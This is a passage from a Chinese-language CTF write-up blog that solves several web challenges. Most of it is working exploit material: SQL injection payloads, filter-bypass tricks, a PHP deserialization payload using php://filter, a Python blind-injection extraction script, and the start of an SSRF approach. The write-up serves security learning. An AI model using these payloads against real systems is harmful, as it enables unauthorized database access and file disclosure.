class="hljs-comment">// echo &#x27;&lt;pre&gt;&#x27;;</span>$arr = mysqli_fetch_row($result);<span class="hljs-comment">// print_r($arr);</span><span class="hljs-keyword">if</span>($arr[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;    <span class="hljs-comment">//第二列数据要等于admin</span><span class="hljs-keyword">if</span>(md5($password) == $arr[<span class="hljs-number">2</span>])&#123;   <span class="hljs-comment">//第三列数据要等与密码的MD5</span><span class="hljs-keyword">echo</span> $flag;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong pass!&quot;</span>);&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong user!&quot;</span>);&#125;&#125;&#125;</code></pre><p>payload:</p><pre><code class="hljs apache"><span class="hljs-attribute">123456</span>  md<span class="hljs-number">5</span>:e<span class="hljs-number">10</span>adc<span class="hljs-number">3949</span>ba<span class="hljs-number">59</span>abbe<span class="hljs-number">56</span>e<span class="hljs-number">057</span>f<span class="hljs-number">20</span>f<span class="hljs-number">883</span>e<span class="hljs-attribute">name</span>=&#x27;union select <span class="hljs-number">1</span>,&#x27;admin&#x27;,&#x27;e<span class="hljs-number">10</span>adc<span class="hljs-number">3949</span>ba<span class="hljs-number">59</span>abbe<span class="hljs-number">56</span>e<span class="hljs-number">057</span>f<span class="hljs-number">20</span>f<span class="hljs-number">883</span>e&#x27;#&amp;pw=<span class="hljs-number">123456</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309131226258.png" alt="image-20220309131226258" style="zoom:67%;"></p><h2 id="网鼎杯-2020-青龙组areuserialz">[网鼎杯 2020青龙组]AreUSerialz</h2><h4 id="考点反序列化构造伪协议绕过file_get_contents私有属性序列化后00被拦截">考点：反序列化构造、伪协议绕过file_get_contents、私有属性序列化后%00被拦截</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;    <span class="hljs-keyword">protected</span> $op;    <span class="hljs-keyword">protected</span> $filename;    <span class="hljs-keyword">protected</span> $content;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        $op = <span class="hljs-string">&quot;1&quot;</span>;        $filename = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;        $content = <span class="hljs-string">&quot;Hello World!&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;process();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;            <span class="hljs-keyword">$this</span>-&gt;write();        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;            $res = <span class="hljs-keyword">$this</span>-&gt;read();            <span class="hljs-keyword">$this</span>-&gt;output($res);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;content)) &#123;            <span class="hljs-keyword">if</span>(strlen((<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;                <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Too long!&quot;</span>);                <span class="hljs-keyword">die</span>();            &#125;            $res = file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;content);            <span class="hljs-keyword">if</span>($res) <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Successful!&quot;</span>);            <span class="hljs-keyword">else</span> <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;        $res = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename)) &#123;            $res = file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);        &#125;        <span class="hljs-keyword">return</span> $res;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params">$s</span>) </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;        <span class="hljs-keyword">echo</span> $s;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-comment">//4，要跳过写，直接读：op必须不满足===2，且满足==2</span>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)             <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;          <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;process();    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params">$s</span>) </span>&#123;    <span class="hljs-comment">//  2</span>    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; strlen($s); $i++)        <span class="hljs-keyword">if</span>(!(ord($s[$i]) &gt;= <span class="hljs-number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="hljs-number">125</span>))   <span class="hljs-comment">//ord返回ASCII，21-125：可见字符</span>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;    $str = (<span class="hljs-keyword">string</span>)$_GET[<span class="hljs-string">&#x27;str&#x27;</span>];  <span class="hljs-comment">//1</span>    <span class="hljs-keyword">if</span>(is_valid($str)) &#123;         $obj = unserialize($str);  <span class="hljs-comment">//3</span>    &#125;&#125;</code></pre><p>整个流程：GET传参序列化字符串，满足ASCII有效后执行destruct函数，属性op不满足<code>===2</code>，满足<code>==2</code>，就会执行read函数，file_get_contents读取文件并返回结果</p><ol type="1"><li>一开始没想到file_get_contents，直接读了flag.php，发现不对，才反应过来<strong>有file_get_contents</strong>==》利用伪协议php://filter，读源码</li><li>同时还要注意：==private属性序列化的时候格式是%00类名%00成员名，自写脚本直接生成序列化字符串后还要手动加上%00==</li></ol><p>构造脚本：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;    <span class="hljs-keyword">protected</span> $op=<span class="hljs-number">2</span>;    <span class="hljs-keyword">protected</span> $filename=<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;    <span class="hljs-keyword">protected</span> $content;&#125;$flag = <span class="hljs-keyword">new</span> FileHandler();$flag_1 = serialize($flag);<span class="hljs-keyword">echo</span> $flag_1;</code></pre><pre><code class="hljs less">再手动加上%<span class="hljs-selector-tag">00</span><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:11</span><span class="hljs-selector-pseudo">:&quot;FileHandler&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;%00*%00op&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">2</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;%00*%00filename&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">52</span>:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;%00*%00content&quot;</span>;<span class="hljs-selector-tag">N</span>;&#125;</code></pre><ol start="3" type="1"><li><p>然后发现又不对，<strong>因为空字符的ASCII是0，不满足一开始的ASCII有效检验</strong>，就不会往后执行，反序列化</p><pre><code class="hljs aspectj"><span class="hljs-function">echo <span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">&#x27;&#x27;</span>)</span></span>;   <span class="hljs-comment">//0</span></code></pre></li></ol><h4 id="如何绕过呢00">如何绕过呢%00？</h4><ul><li><strong>简单的一种是：php7.1+版本对属性类型不敏感，使用 public修饰成员并序列化，反序列化后还是public——本地序列化的时候将属性改为public进行绕过即可</strong></li></ul><p>构造脚本：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;    <span class="hljs-keyword">public</span> $op=<span class="hljs-number">2</span>;    <span class="hljs-keyword">public</span> $filename=<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;    <span class="hljs-keyword">public</span> $content;&#125;$flag = <span class="hljs-keyword">new</span> FileHandler();$flag_1 = serialize($flag);<span class="hljs-keyword">echo</span> $flag_1;</code></pre><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">52</span>:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;N;&#125;</code></pre><p><span style="background:#FF9999;">注意</span>：一开始我用的op="2a"，发现不行，因为要<code>不满足===且满足=="2"</code>，这里满足的是<strong>弱等于字符串2，而不是数字2</strong></p><pre><code class="hljs ini"><span class="hljs-attr">&quot;2a&quot;</span>  ==  <span class="hljs-string">&quot;2&quot;</span>  x<span class="hljs-attr">&quot;2a&quot;</span>  ==   <span class="hljs-number">2</span>   √<span class="hljs-attr">&quot;2&quot;</span>   ==   <span class="hljs-number">2</span>   √</code></pre><p>然后成功读到flag.php的base64源码，解码得到flag</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312203106671.png" alt="image-20220312203106671"></p><h2 id="gyctf2020blacklist">[GYCTF2020]Blacklist</h2><blockquote><p><a href="https://www.cnblogs.com/zzjdbk/p/13681752.html">参考wp</a></p><p><a href="https://xz.aliyun.com/t/7169#toc-47">一些过滤技巧总结</a></p></blockquote><h4 id="考点堆叠注入类似强网杯handler代替select查询">考点：堆叠注入，类似强网杯、handler代替select查询</h4><p>万能密码，爆出3个内容</p><pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312212345118.png" alt="image-20220312212345118" style="zoom:50%;"></p><p>查出来两个字段</p><pre><code class="hljs crmsh">?<span class="hljs-attr">inject=</span><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">2</span>--+</code></pre><p>黑名单：</p><pre><code class="hljs sql">return preg_match(&quot;/<span class="hljs-keyword">set</span>|<span class="hljs-keyword">prepare</span>|<span class="hljs-keyword">alter</span>|<span class="hljs-keyword">rename</span>|<span class="hljs-keyword">select</span>|<span class="hljs-keyword">update</span>|<span class="hljs-keyword">delete</span>|<span class="hljs-keyword">drop</span>|<span class="hljs-keyword">insert</span>|<span class="hljs-keyword">where</span>|\./i<span class="hljs-string">&quot;,$inject);</span></code></pre><p>只回显一部分数据</p><pre><code class="hljs lsl">?inject=<span class="hljs-number">1</span>&#x27;union selec\at <span class="hljs-number">1</span>,<span class="hljs-number">2</span>%<span class="hljs-number">23</span>er version for the right syntax to use near &#x27;selec\at <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#&#x27;&#x27; at line <span class="hljs-number">1</span></code></pre><p>猜测可能是union被吞了：尝试双写，都不行</p><pre><code class="hljs crystal"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union union s\aelect 1,2%23</span><span class="hljs-string">he right syntax to use near &#x27;</span><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">s</span>\<span class="hljs-title">aelect</span> 1,2<span class="hljs-comment">#&#x27;&#x27; at line 1</span></span></code></pre><p>应该是检测到了union整个单词，然后报错，还是不行</p><pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27;u&lt;&gt;nion sel&lt;&gt;ect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>%<span class="hljs-number">23</span>t syntax to use near &#x27;u&lt;&gt;nion sel&lt;&gt;ect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#&#x27;&#x27; at line <span class="hljs-number">1</span></code></pre><p><strong>试试堆叠注入</strong>：查看所有库名</p><pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">databases</span>;   //这里1后必须要有单引号（字符注入），尾巴<span class="hljs-comment">#可要可不要</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312212801712.png" alt="image-20220312212801712"></p><p>查看当前库下表名：</p><pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<span class="hljs-comment">#</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312213008971.png" alt="image-20220312213008971"></p><h4 id="利用handler直接读表内容">利用handler直接读表内容</h4><blockquote><p><strong>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据</strong></p><p><strong>不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中</strong></p></blockquote><pre><code class="hljs sql">?inject=1&#x27;;<span class="hljs-keyword">handler</span> FlagHere <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> a;<span class="hljs-keyword">handler</span> a <span class="hljs-keyword">read</span> <span class="hljs-keyword">first</span>;<span class="hljs-keyword">handler</span> a <span class="hljs-keyword">close</span>;<span class="hljs-comment">#</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312213440831.png" alt="image-20220312213440831"></p><p>读表列名：flag表有一列</p><pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> <span class="hljs-string">`FlagHere`</span>;</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312213600223.png" alt="image-20220312213600223" style="zoom:67%;"></p><p>而另一张表：有两列</p><pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> <span class="hljs-string">`words`</span>;</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313100505291.png" alt="image-20220313100505291" style="zoom:50%;"></p><h4 id="如果利用强网杯的思路">如果利用强网杯的思路：</h4><blockquote><p>1、将words表名替换成其他的</p><p>2、然后将 <code>FlagHere</code> 这个表名称替换成words</p><p>3、在把flag这个字段替换成data</p><p>4、最后再插入（新增）一个id字段</p><p>最终的查询结果就可以输出我们构造的新的words了</p></blockquote><pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">rename</span> <span class="hljs-keyword">to</span> words1;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-string">`FlagHere`</span> <span class="hljs-keyword">rename</span> <span class="hljs-keyword">to</span> words;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">change</span> flag <span class="hljs-keyword">id</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">50</span>);<span class="hljs-comment">#</span>再利用万能密码爆出表数据</code></pre><p>但是回显，发现过滤了很多：</p><pre><code class="hljs sql">return preg_match(&quot;/<span class="hljs-keyword">set</span>|<span class="hljs-keyword">prepare</span>|<span class="hljs-keyword">alter</span>|<span class="hljs-keyword">rename</span>|<span class="hljs-keyword">select</span>|<span class="hljs-keyword">update</span>|<span class="hljs-keyword">delete</span>|<span class="hljs-keyword">drop</span>|<span class="hljs-keyword">insert</span>|<span class="hljs-keyword">where</span>|\./i<span class="hljs-string">&quot;,$inject);</span></code></pre><p>那就只能用handler</p><h4 id="总结">总结：</h4><p>1.prepare的语句</p><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;[my sql sequece]&#x27;</span>;   //预定义SQL语句<span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">name</span>;  //执行预定义SQL语句(<span class="hljs-keyword">DEALLOCATE</span> || <span class="hljs-keyword">DROP</span>) <span class="hljs-keyword">PREPARE</span> <span class="hljs-keyword">name</span>;  //删除预定义SQL语句，可以不用！即：<span class="hljs-keyword">SET</span> @tn = <span class="hljs-string">&#x27;hahaha&#x27;</span>;  //存储表名<span class="hljs-keyword">SET</span> @<span class="hljs-keyword">sql</span> = <span class="hljs-keyword">concat</span>(<span class="hljs-string">&#x27;select * from &#x27;</span>, @tn);  //存储SQL语句<span class="hljs-keyword">PREPARE</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">from</span> @<span class="hljs-keyword">sql</span>;   //预定义SQL语句<span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">name</span>;  //执行预定义SQL语句(<span class="hljs-keyword">DEALLOCATE</span> || <span class="hljs-keyword">DROP</span>) <span class="hljs-keyword">PREPARE</span> sqla;  //删除预定义SQL语句（可以不用）</code></pre><p>2.select被过滤的姿势</p><pre><code class="hljs lsl">大小写绕过、&lt;&gt;、双写、%<span class="hljs-number">0</span>a、%<span class="hljs-number">0</span>d、/！**/利用char函数，select——char(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>)<span class="hljs-number">1</span>&#x27;;PREPARE jwt from concat(char(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>), &#x27; * from `<span class="hljs-number">1919810931114514</span>` &#x27;);EXECUTE jwt;#可以拼接<span class="hljs-number">1</span>&#x27;;set @a=concat(<span class="hljs-string">&quot;sel&quot;</span>,<span class="hljs-string">&quot;ect flag from 1919810931114514&quot;</span>);prepare hello from @a;execute hello;# 用handler代替，handler直接读表的一行数据<span class="hljs-number">1</span>&#x27;;handler `<span class="hljs-number">1919810931114514</span>` open as a;handler a read first;handler a close;#  <span class="hljs-comment">//注意：这里有的题必须close handler才可以获取Flag</span>或利用十六进制编码绕过set @a=concat(<span class="hljs-string">&quot;sel&quot;</span>,<span class="hljs-string">&quot;ect flag from `1919810931114514`&quot;</span>); <span class="hljs-comment">//或者将select * from ` 1919810931114514 `进行16进制编码</span><span class="hljs-comment">//@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>prepare hello from @a；execute hello;</code></pre><h2 id="ciscn2019-华北赛区-day2-web1hack-world">[CISCN2019 华北赛区 Day2Web1]Hack World</h2><h4 id="考点盲注只回显trueflasepython脚本判断字符爆flag">考点：盲注只回显true/flase、python脚本判断字符爆flag</h4><p>思路：输入框测试发现回显bool(false)、无报错，对关键词敏感，但是发现输入4/2对应输出2的内容——说明有逻辑判断，尝试if语句，成功——写脚本爆出flag</p><blockquote><p><a href="https://inanb.github.io/2021/01/30/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/">参考WP</a></p></blockquote><pre><code class="hljs lsl">输入<span class="hljs-number">1</span>回显Hello, glzjin wants a girlfriend.输入<span class="hljs-number">2</span>回显Do you want to be my girlfriend?输入‘回显**bool(false)**输入<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span> ,SQL Injection Checked.输入&#x27;%<span class="hljs-number">23</span>，SQL Injection Checked.<span class="hljs-number">4</span>/<span class="hljs-number">2</span>——Do you want to be my girlfriend?只有两个数据，输入<span class="hljs-number">3</span>及以上就返回Error Occured When Fetch Result.</code></pre><p><strong>但是好多字符包括空格都给过滤了</strong></p><p>但是：1/1、4/2是可以出结果的，也就是说，可以借助<strong>逻辑判断</strong>返回1和0，判断逻辑的真假。</p><blockquote><p>if类似三目运算if(条件,expr2,expr3)，如果条件为true,则返回expr2的值，否则返回3</p></blockquote><p>布尔盲注：只返回true/false</p><p>空格被过滤：利用（）</p><pre><code class="hljs subunit">id=if(length((select(flag)from(flag)))=42,1,0)Hello, glzjin wants a girlfriend.id=if(length((select(flag)from(flag)))=43,1,0)<span class="hljs-keyword">Error </span>Occured When Fetch Result.</code></pre><p>说明flag长度是42</p><h4 id="guid">GUID</h4><p>什么是 GUID？又叫uuid（通用标识符）</p><ul><li><p>全球唯一标识符 (GUID)是一个字母数字标识符，用于指示产品的唯一性安装。在许多流行软件应用程序（例如Web 浏览器和媒体播放器）中，都使用 GUID。</p></li><li><p>GUID 的格式为“xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx”，其中每个 x是 0-9 或 a-f范围内的一个十六进制的数字。例如：6F9619FF-8B86-D011-B42D-00C04FC964FF即为有效的 GUID 值</p></li><li><p>{CAF53C68-A94C-11D2-BB4A-00C04FA330A6}</p></li></ul><p>先写出一个核心的语句，判断flag的第一个字符是否ascii码为101</p><pre><code class="hljs angelscript"><span class="hljs-keyword">if</span>((ascii(substr((select(flag)<span class="hljs-keyword">from</span>(flag)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">101</span>),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)ASCII <span class="hljs-number">101</span> :eDo you want to be my girlfriend?  <span class="hljs-comment">//说明不是e</span></code></pre><p>然后放到burp里爆出第一个字符是f，ASCII为102</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313112559474.png" alt="image-20220313112559474" style="zoom:67%;"></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> timeurl = <span class="hljs-string">&#x27;http://9a1163f4-44f5-4def-9fca-a0c669acfeae.node4.buuoj.cn:81/index.php&#x27;</span>flag=<span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">43</span>):    l = <span class="hljs-number">32</span>    r = <span class="hljs-number">126</span>    <span class="hljs-keyword">while</span> r &gt; l:        mid = <span class="hljs-built_in">int</span>((l+r+<span class="hljs-number">1</span>) / <span class="hljs-number">2</span>)        x = <span class="hljs-built_in">str</span>(x)        y = <span class="hljs-built_in">str</span>(mid)        <span class="hljs-built_in">id</span> = &#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&#x27;if(ascii(substr((select(flag)from(flag)),&#x27;</span>+x+<span class="hljs-string">&#x27;,1))&gt;=&#x27;</span>+y+<span class="hljs-string">&#x27;,1,0)&#x27;</span>&#125;  <span class="hljs-comment">#python字符串拼接用+</span>        response = requests.post(url=url,data=<span class="hljs-built_in">id</span>)        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> response.text:            l = mid        <span class="hljs-keyword">else</span>:            r = mid<span class="hljs-number">-1</span>        time.sleep(<span class="hljs-number">0.03</span>)  <span class="hljs-comment">#延时处理防止频繁访问导致网页不正常回显产生坏点（得益于sql延时注入了解了sleep函数）</span>    flag+=(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(r)))    print(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(r)))print(flag)</code></pre><h2 id="网鼎杯-2018fakebook">[网鼎杯 2018]Fakebook</h2><h4 id="考点sql注入反序列化curl_execssrf">考点：SQL注入、反序列化+curl_exec、SSRF</h4><p>访问tobots.txt，得到备份文件</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313134519393.png" alt="image-20220313134519393"></p><p>访问/user.php.bak，下载备份文件，得到php代码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name, $age, $blog</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;name = $name;        <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)$age;        <span class="hljs-keyword">$this</span>-&gt;blog = $blog;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">$url</span>)</span><span class="hljs-function">    </span>&#123;        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);        $output = curl_exec($ch);   <span class="hljs-comment">//注意！SSRF</span>        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        <span class="hljs-keyword">if</span>($httpCode == <span class="hljs-number">404</span>) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;        &#125;        curl_close($ch);        <span class="hljs-keyword">return</span> $output;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $blog = <span class="hljs-keyword">$this</span>-&gt;blog;        <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);    &#125;&#125;</code></pre><p>get方法中，<strong>curl_exec()如果使用不当就会导致ssrf漏洞</strong>。有一点思路了，而我们在御剑扫到了flag.php（我没扫到，猜测跟index.php在同一目录）。猜测可能flag.php处于内网，</p><p>如果用ssrf访问flag.php，可以==用伪协议file://var/www/html/flag.php访问。==</p><ol type="1"><li>随便注册一个用户abd,密码123，age11，blog:https://www.baidu.com，访问注册的用户，发现返回刚刚注册的内容，blog是输入的www.baidu.com</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313152014417.png" alt="image-20220313152014417"></p><ol start="2" type="1"><li>然后下面的content查看源码，解码发现是www.baidu.com的首页内容==》<strong>有思路了</strong>，blog用file://读本地文件，下面的content回显base64的文件源码，利用ssrf伪协议读本地源码</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313152050715.png" alt="image-20220313152050715"></p><ol start="3" type="1"><li><p>但是直接注册用户，blog那里有严格的preg过滤：<strong>所以想在这个位置运用file协议不行</strong></p></li><li><p>注册用户后，访问用户时发现url里有<strong>参数no，尝试修改，发现注入点，但也有waf</strong></p></li></ol><pre><code class="hljs pgsql">/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>%<span class="hljs-number">20</span><span class="hljs-keyword">order</span>%<span class="hljs-number">20</span><span class="hljs-keyword">by</span>%<span class="hljs-number">205</span>   //  [*] query error! (<span class="hljs-type">Unknown</span> <span class="hljs-keyword">column</span> <span 